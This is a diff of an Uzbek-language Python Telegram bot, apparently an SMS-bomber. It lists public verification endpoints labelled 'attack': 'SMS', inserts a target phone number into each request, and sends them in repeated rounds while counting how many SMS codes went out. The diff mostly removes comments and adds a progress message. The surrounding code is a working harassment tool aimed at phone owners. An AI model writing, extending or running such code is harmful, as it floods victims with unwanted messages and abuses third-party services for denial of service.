@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-NOTBSIDE Telegram Bot - 100% MUSTAQIL KOD
+NOTBSIDE Telegram Bot - 100% MUSTAQIL VA TOZA KOD
 Hech qanday tashqi papka (Core, INSIDE-main) talab qilmaydi.
-Render uchun veb-server va tayyor API'lar bilan.
 """
 import asyncio
 import os
@@ -17,16 +16,13 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 
 # ==================== SOZLAMALAR ====================
-# Render'dagi Environment Variables dan olinadi. 
-# Diqqat: Render'da BOT_TOKEN va ADMIN_IDS ni kiritishni unutmang!
 BOT_TOKEN = os.getenv("BOT_TOKEN", "SIZNING_TOKENINGIZNI_SHU_YERGA_YOZING")
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7472073326").split(",")]
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# ==================== TAYYOR API'LAR (Services.py dan) ====================
-# Bu yerga eng ko'p ishlaydigan xizmatlar kiritildi (Telegram, Yandex)
+# ==================== TAYYOR API'LAR ====================
 SERVICES_LIST = [
     {
         'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Telegram.org'},
@@ -65,9 +61,7 @@ def filter_services(services, number):
 
 async def send_request(session, service, number):
     try:
-        # URL va Data ichidagi {number} ni haqiqiy raqamga almashtiramiz
         url = service['url'].replace('{number}', number)
-        
         data = {}
         if 'data' in service:
             for k, v in service['data'].items():
@@ -78,7 +72,6 @@ async def send_request(session, service, number):
 
         async with session.request(service['method'], url, data=data, timeout=10) as resp:
             text = await resp.text()
-            # Muvaffaqiyat belgilarini tekshirish
             kw = ["sent", "success", "ok", "true", "отправлен", "yuborildi", "code_sent"]
             ok = any(k in text.lower() for k in kw) and 200 <= resp.status < 300
             return {"website": service["info"]["website"], "success": ok}
@@ -205,6 +198,7 @@ async def inside_confirm(message: types.Message, state: FSMContext):
         total_req += len(valid); total_ok += len(ok)
         
         text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n📤 {len(valid)} so'rov\n✓ SMS: <b>{len(ok)}</b>\n"
+        await status.edit_text(text, parse_mode="HTML")
         if i < d["circles"] - 1: await asyncio.sleep(3)
         
     final = f"🏁 <b>Yakunlandi</b>\n\n📊 Jami so'rovlar: {total_req}\n📨 SMS yuborilgan: <b>{total_ok}</b>"
